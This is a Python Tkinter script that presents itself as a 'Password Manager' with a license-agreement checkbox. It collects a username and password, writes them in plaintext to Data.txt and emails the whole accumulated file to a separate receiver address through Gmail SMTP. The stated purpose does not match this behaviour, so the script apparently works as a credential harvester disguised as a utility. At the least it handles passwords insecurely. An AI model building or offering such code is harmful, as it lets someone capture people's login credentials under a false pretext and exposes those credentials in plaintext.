import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

from tkinter import *

# Declare these variables as global so they can be accessed in functions
user_name_entry = None
user_pass_entry = None
check_box_var = None

def submit_button_click():
    global user_name_entry, user_pass_entry, check_box_var

    username = user_name_entry.get()
    password = user_pass_entry.get()

    if not username or not password:
        print("Username and password are required.")
        return

    print("Your Data Will Be Submitted")
    print(f"Username: {username}, Password: {password}, License Checked: {check_box_var.get()}")

    with open("Data.txt", "a") as f:
        f.write(f"Username: {username}, Password: {password}, License Checked: {check_box_var.get()}\n")

    send_email()

def send_email():
    sender_email = "Sender Email"
    sender_password = "App Password Of Sender Email" #This Can Be Found Easily From Account Page Of Google
    receiver_email = "Recever Email"

    subject = "Password Manager Data"
    body = get_data()

    message = MIMEMultipart()
    message["From"] = sender_email
    message["To"] = receiver_email
    message["Subject"] = subject
    message.attach(MIMEText(body, "plain"))

    try:
        with smtplib.SMTP("smtp.gmail.com", 587) as server:
            server.starttls()
            server.login(sender_email, sender_password)
            text = message.as_string()
            server.sendmail(sender_email, receiver_email, text)
        print("The Data Will Be Saved")
    except Exception as e:
        print(f"Error sending email: {e}")

def get_data():
    with open("Data.txt", "r") as f:
        return f.read()

def main():
    global user_name_entry, user_pass_entry, check_box_var

    root = Tk()
    canvas_width = 300
    canvas_height = 90
    root.geometry(f"{canvas_width}x{canvas_height}")
    root.minsize(300, 100)
    root.maxsize(300, 100)
    root.configure(bg="white")
    root.title("Password Manager")

    user_name_label = Label(root, text="Enter The Username:", font=("Arial", 11), fg="black", relief="sunken")
    user_name_label.grid(row=1, column=1, pady=5)

    user_pass_label = Label(root, text="Enter The Password:", font=("Arial", 11), fg="black", relief="sunken")
    user_pass_label.grid(row=2, column=1, pady=5)

    user_name_entry = Entry(root, font=("Sans-serif", 10), fg="darkblue", relief="sunken")
    user_name_entry.grid(row=1, column=2, pady=5)

    user_pass_entry = Entry(root, font=("Sans-serif", 10), show="*", fg="red", relief="sunken")
    user_pass_entry.grid(row=2, column=2, pady=5)

    check_box_var = IntVar()
    rem_checkbox = Checkbutton(root, text="Check The License Agreement", variable=check_box_var, fg="black")
    rem_checkbox.place(x = 1 , y = 64)

    button = Button(root, text="Submit", fg="darkred", relief="sunken", command=submit_button_click)
    button.place(x=218, y=66)

    root.mainloop()

if __name__ == "__main__":
    main()
